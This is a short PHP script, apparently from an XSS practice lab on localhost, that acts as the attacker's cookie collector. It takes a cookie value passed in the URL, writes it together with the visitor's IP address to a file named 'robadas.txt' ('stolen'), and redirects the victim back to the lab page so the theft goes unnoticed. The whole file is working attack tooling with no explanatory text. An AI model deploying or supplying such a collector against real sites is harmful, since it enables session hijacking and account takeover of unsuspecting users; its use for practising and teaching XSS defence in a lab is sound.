
<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $data = "IP: " . $ip . " - Cookie: " . $cookie . "\n";
    file_put_contents('robadas.txt', $data, FILE_APPEND);
    header('Location: http://localhost/lab_xss/index.php');
} else {
    echo "No se encontró ninguna cookie.";
}
?>
